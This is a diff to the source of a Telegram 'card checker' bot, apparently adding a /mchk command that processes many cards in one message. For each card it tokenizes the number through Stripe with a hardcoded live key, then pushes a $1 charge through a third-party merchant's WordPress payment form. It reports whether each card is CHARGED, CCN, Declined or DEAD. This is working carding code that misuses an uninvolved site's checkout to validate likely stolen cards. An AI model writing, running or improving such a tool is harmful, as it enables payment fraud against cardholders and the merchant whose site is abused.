@@ -59,22 +59,21 @@ UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'
 async def is_owner(user_id):
     return user_id == OWNER
 
-async def is_card_valid(card_number: str) -> bool: return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0
+async def is_card_valid(card_number: str) -> bool: 
+    return (sum( map(lambda n: n[1] + (n[0] % 2 == 0) * (n[1] - 9 * (n[1] > 4)), enumerate(map(int, card_number[:-1]))) ) + int(card_number[-1])) % 10 == 0
 
 
 @dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
 async def helpstr(message: types.Message):
-    # await message.answer_chat_action('typing')
     keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
-    btns = types.InlineKeyboardButton("Bot Source", url="https://github.com/chrichrilaubie/Mrbannker")
+    btns = types.InlineKeyboardButton("Bot Source", url="https://github.com/xbinner18/Mrbannker")
     keyboard_markup.row(btns)
     FIRST = message.from_user.first_name
     MSG = f'''
 Hello {FIRST}, Im {BOT_NAME}
 U can find my Boss  <a href="tg://user?id={OWNER}">HERE</a>
 Cmds /chk /info /bin'''
-    await message.answer(MSG, reply_markup=keyboard_markup,
-                        disable_web_page_preview=True)
+    await message.answer(MSG, reply_markup=keyboard_markup, disable_web_page_preview=True)
 
 
 @dp.message_handler(commands=['info', 'id'], commands_prefix=PREFIX)
@@ -99,139 +98,126 @@ async def info(message: types.Message):
 <b>BOT-OWNER:</b> {await is_owner(user_id)}
 ╘═════════''')
 
-
-@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
-async def binio(message: types.Message):
-    await message.answer_chat_action('typing')
-    ID = message.from_user.id
-    FIRST = message.from_user.first_name
-    BIN = message.text[len('/bin '):]
-    if len(BIN) < 6:
-        return await message.reply(
-                   'Send bin not ass'
-        )
-    r = requests.get(
-               f'https://bins.ws/search?bins={BIN[:6]}'
-    ).text
-    soup = bs(r, features='html.parser')
-    k = soup.find("div", {"class": "page"})
-    INFO = f'''
-{k.text[62:]}
-SENDER: <a href="tg://user?id={ID}">{FIRST}</a>
-BOT⇢ @{BOT_USERNAME}
-OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
-'''
-    await message.reply(INFO)
-
-
-@dp.message_handler(commands=['chk'], commands_prefix=PREFIX)
-async def ch(message: types.Message):
+# Nouvelle commande /mchk pour vérifier plusieurs cartes en même temps
+@dp.message_handler(commands=['mchk'], commands_prefix=PREFIX)
+async def multi_chk(message: types.Message):
     await message.answer_chat_action('typing')
     tic = time.perf_counter()
     ID = message.from_user.id
     FIRST = message.from_user.first_name
     s = requests.Session()
+
     try:
-        await dp.throttle('chk', rate=ANTISPAM)
+        await dp.throttle('mchk', rate=ANTISPAM)
     except Throttled:
         await message.reply('<b>Too many requests!</b>\n'
                             f'Blocked For {ANTISPAM} seconds')
     else:
-        if message.reply_to_message:
-            cc = message.reply_to_message.text
-        else:
-            cc = message.text[len('/chk '):]
+        # Récupérer tous les numéros de cartes de l'utilisateur
+        cards = message.text[len('/mchk '):].splitlines()  # Diviser par lignes
 
-        if len(cc) == 0:
-            return await message.reply("<b>No Card to chk</b>")
+        if len(cards) == 0:
+            return await message.reply("<b>No Cards to check</b>")
 
-        x = re.findall(r'\d+', cc)
-        ccn = x[0]
-        mm = x[1]
-        yy = x[2]
-        cvv = x[3]
-        if mm.startswith('2'):
-            mm, yy = yy, mm
-        if len(mm) >= 3:
-            mm, yy, cvv = yy, cvv, mm
-        if len(ccn) < 15 or len(ccn) > 16:
-            return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
-        BIN = ccn[:6]
-        if BIN in BLACKLISTED:
-            return await message.reply('<b>BLACKLISTED BIN</b>')
-        if await is_card_valid(ccn) != True:
-            return await message.reply('<b>Invalid luhn algorithm</b>')
-        # get guid muid sid
-        headers = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
-        }
+        results = []
+        for cc in cards:
+            cc = cc.strip()
+            if len(cc) == 0:
+                continue  # Passer aux prochaines cartes si le numéro est vide
 
-        # b = session.get('https://ip.seeip.org/', proxies=proxies).text
+            x = re.findall(r'\d+', cc)
+            if len(x) < 4:
+                results.append(f"❌<b>Invalid format for card:</b> {cc}")
+                continue
 
-        m = s.post('https://m.stripe.com/6', headers=headers)
-        r = m.json()
-        Guid = r['guid']
-        Muid = r['muid']
-        Sid = r['sid']
+            ccn = x[0]
+            mm = x[1]
+            yy = x[2]
+            cvv = x[3]
+            if mm.startswith('2'):
+                mm, yy = yy, mm
+            if len(mm) >= 3:
+                mm, yy, cvv = yy, cvv, mm
+            if len(ccn) < 15 or len(ccn) > 16:
+                results.append(f"❌<b>Failed to parse card:</b> {ccn}")
+                continue
+            BIN = ccn[:6]
+            if BIN in BLACKLISTED:
+                results.append(f"❌<b>BLACKLISTED BIN for card:</b> {ccn}")
+                continue
+            if await is_card_valid(ccn) != True:
+                results.append(f"❌<b>Invalid Luhn algorithm for card:</b> {ccn}")
+                continue
 
-        postdata = {
-            "guid": Guid,
-            "muid": Muid,
-            "sid": Sid,
-            "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
-            "card[name]": Name,
-            "card[number]": ccn,
-            "card[exp_month]": mm,
-            "card[exp_year]": yy,
-            "card[cvc]": cvv
-        }
+            # Process the card normally as in /chk
+            headers = {
+                "user-agent": UA,
+                "accept": "application/json, text/plain, */*",
+                "content-type": "application/x-www-form-urlencoded"
+            }
 
-        HEADER = {
-            "accept": "application/json",
-            "content-type": "application/x-www-form-urlencoded",
-            "user-agent": UA,
-            "origin": "https://js.stripe.com",
-            "referer": "https://js.stripe.com/",
-            "accept-language": "en-US,en;q=0.9"
-        }
+            m = s.post('https://m.stripe.com/6', headers=headers)
+            r = m.json()
+            Guid = r['guid']
+            Muid = r['muid']
+            Sid = r['sid']
 
-        pr = s.post('https://api.stripe.com/v1/tokens',
-                          data=postdata, headers=HEADER)
-        Id = pr.json()['id']
-        if pr.status_code != 200:
-            return await message.reply("<b>Site is Dead</b>")
-        nonce = s.get("https://www.hwstjohn.com/pay-now/")
-        form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
-        # hmm
-        load = {
-            "action": "wp_full_stripe_payment_charge",
-            "formName": "default",
-            "formNonce": form,
-            "fullstripe_name": Name,
-            "fullstripe_email": Email,
-            "fullstripe_custom_amount": "1",
-            "fullstripe_amount_index": 0,
-            "stripeToken": Id
-        }
+            postdata = {
+                "guid": Guid,
+                "muid": Muid,
+                "sid": Sid,
+                "key": "pk_live_Ng5VkKcI3Ur3KZ92goEDVRBq",
+                "card[name]": Name,
+                "card[number]": ccn,
+                "card[exp_month]": mm,
+                "card[exp_year]": yy,
+                "card[cvc]": cvv
+            }
 
-        header = {
-            "accept": "application/json, text/javascript, */*; q=0.01",
-            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-            "user-agent": UA,
-            "accept-language": "en-US,en;q=0.9"
-        }
+            HEADER = {
+                "accept": "application/json",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": UA,
+                "origin": "https://js.stripe.com",
+                "referer": "https://js.stripe.com/",
+                "accept-language": "en-US,en;q=0.9"
+            }
 
-        rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
-                          data=load, headers=header)
-        msg = rx.json()['msg']
+            pr = s.post('https://api.stripe.com/v1/tokens',
+                        data=postdata, headers=HEADER)
+            Id = pr.json()['id']
+            if pr.status_code != 200:
+                results.append(f"❌<b>Failed to process card:</b> {ccn}")
+                continue
+            nonce = s.get("https://www.hwstjohn.com/pay-now/")
+            form = re.findall(r'formNonce" value="([^\'" >]+)', nonce.text)
 
-        toc = time.perf_counter()
+            load = {
+                "action": "wp_full_stripe_payment_charge",
+                "formName": "default",
+                "formNonce": form,
+                "fullstripe_name": Name,
+                "fullstripe_email": Email,
+                "fullstripe_custom_amount": "1",
+                "fullstripe_amount_index": 0,
+                "stripeToken": Id
+            }
 
-        if 'true' in rx.text:
-            return await message.reply(f'''
+            header = {
+                "accept": "application/json, text/javascript, */*; q=0.01",
+                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "user-agent": UA,
+                "accept-language": "en-US,en;q=0.9"
+            }
+
+            rx = s.post('https://www.hwstjohn.com/wp-admin/admin-ajax.php',
+                        data=load, headers=header)
+            msg = rx.json()['msg']
+
+            toc = time.perf_counter()
+
+            if 'true' in rx.text:
+                results.append(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #CHARGED 1$
 <b>MSG</b>➟ {msg}
@@ -240,8 +226,8 @@ async def ch(message: types.Message):
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
-        if 'security code' in rx.text:
-            return await message.reply(f'''
+            elif 'security code' in rx.text:
+                results.append(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #CCN
 <b>MSG</b>➟ {msg}
@@ -250,8 +236,8 @@ async def ch(message: types.Message):
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
-        if 'false' in rx.text:
-            return await message.reply(f'''
+            elif 'false' in rx.text:
+                results.append(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #Declined
 <b>MSG</b>➟ {msg}
@@ -260,7 +246,8 @@ async def ch(message: types.Message):
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
-        await message.reply(f'''
+            else:
+                results.append(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ DEAD
 <b>MSG</b>➟ {rx.text}
@@ -269,6 +256,8 @@ async def ch(message: types.Message):
 <b>OWNER</b>: {await is_owner(ID)}
 <b>BOT</b>: @{BOT_USERNAME}''')
 
+        # Envoyer les résultats à l'utilisateur
+        await message.reply('\n\n'.join(results))
 
-if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True, loop=loop)
+if __name__ == "__main__":
+    executor.start_polling(dp, skip_updates=True)
